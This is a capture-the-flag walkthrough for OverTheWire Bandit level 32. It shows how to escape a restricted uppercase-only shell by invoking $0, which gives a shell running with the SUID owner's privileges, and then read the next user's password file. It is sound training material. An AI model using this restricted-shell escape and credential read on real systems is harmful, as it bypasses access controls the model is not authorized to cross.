
```
ssh bandit32@bandit.labs.overthewire.org -p 2220
```

After logging in we can see a different welcome message and prompt.

```shell
WELCOME TO THE UPPERCASE SHELL
>>
```

Any command that is typed into this prompt will be changed to upper case. This is an issue since linux commands are case sensitive and mostly lower case.

There are a few commands that are upper case by default that we can test.

```shell
>> $SHELL
WELCOME TO THE UPPERCASE SHELL
>> 
```

`$SHELL` worked so what other environment variables can we use to.

We can run `$0` which is generally the first argument of a script, which basically it is its name.

```shell
>> $0
$ 
```

Now we have a normal prompt again we can enter commands as normal.

```shell
$ ls -la 
total 28
drwxr-xr-x  2 root     root     4096 May  7  2020 .
drwxr-xr-x 41 root     root     4096 May  7  2020 ..
-rw-r--r--  1 root     root      220 May 15  2017 .bash_logout
-rw-r--r--  1 root     root     3526 May 15  2017 .bashrc
-rw-r--r--  1 root     root      675 May 15  2017 .profile
-rwsr-x---  1 bandit33 bandit32 7556 May  7  2020 uppershell
```

We can see an `uppershell` script and its SUID bit is set. So `uppershell` is run as user `bandit33`.

```shell
$ id
uid=11033(bandit33) gid=11032(bandit32) groups=11032(bandit32)
```

Using the `id` command we can see we have a uid for bandit33. Since we are running as `bandit33` all we have to do now is read the `/etc/bandit_password/bandit33` to get the password.